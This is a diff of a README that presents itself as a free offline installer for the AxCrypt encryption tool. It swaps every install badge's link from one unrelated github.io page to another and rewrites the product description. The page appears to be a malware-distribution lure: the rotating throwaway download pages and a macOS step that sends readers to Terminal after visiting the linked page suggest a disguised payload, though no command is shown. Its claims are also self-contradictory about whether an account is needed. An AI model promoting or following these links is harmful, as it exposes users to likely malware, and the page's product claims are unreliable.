@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Encryption-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-File+Encryption-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 AxCrypt Free Installer** — AxCrypt is a file encryption application for Windows, macOS, iOS, and Android that integrates into Windows Explorer for simple right-click encryption of files and folders. Works without internet access, no account required. Full offline installation.
+**💻 AxCrypt Free Installer** — AxCrypt is a file encryption tool for Windows that integrates directly into Windows Explorer. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About AxCrypt
 
-AxCrypt is a file encryption application for Windows, macOS, iOS, and Android that integrates into Windows Explorer for simple right-click encryption of files and folders. Using AES-256 encryption, AxCrypt secures individual files for email attachment, USB storage, or cloud backup. The free version provides basic encryption; Premium adds cross-platform mobile access and key sharing features.
+AxCrypt is a file encryption tool for Windows that integrates directly into Windows Explorer. It provides easy right-click encryption and decryption of individual files with AES-256 encryption, password sharing for secure collaboration, and mobile apps for accessing encrypted files.
 
 ---
 
 ## ❌ Problem: AxCrypt is hard to access
 
-- **Subscription for Premium** — Cross-platform and team features require paid subscription
-- **Cloud Account Required** — Recent versions require AxCrypt account for key management
-- **Password Management** — Forgetting the decryption password means permanent data loss
-- **Privacy Concern** — Account-based key management raises questions about key custody
+- **Subscription for Premium Features** — Key features like key sharing require paid plan
+- **Windows-Primary** — macOS version exists but is less integrated with the OS
+- **Single-File Focus** — Best for encrypting individual files; not designed for folder or drive encryption
+- **Account Required** — Creating an AxCrypt account required even for local encryption
 
 ---
 
@@ -61,9 +61,9 @@ AxCrypt is a file encryption application for Windows, macOS, iOS, and Android th
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ AxCrypt is a file encryption application for Windows, macOS, iOS, and Android th
 
 <div align="center">
 
-[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ AxCrypt is a file encryption application for Windows, macOS, iOS, and Android th
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ AxCrypt is a file encryption application for Windows, macOS, iOS, and Android th
 
 ---
 
-**AxCrypt Free Installer** — AxCrypt is a file encryption application for Windows, macOS, iOS, and Android that integrates into Windows Explorer for simple right-click encryption of files and folders. Install without internet connection today!
+**AxCrypt Free Installer** — AxCrypt is a file encryption tool for Windows that integrates directly into Windows Explorer. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AxCrypt](https://img.shields.io/badge/⬇_Install_AxCrypt-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
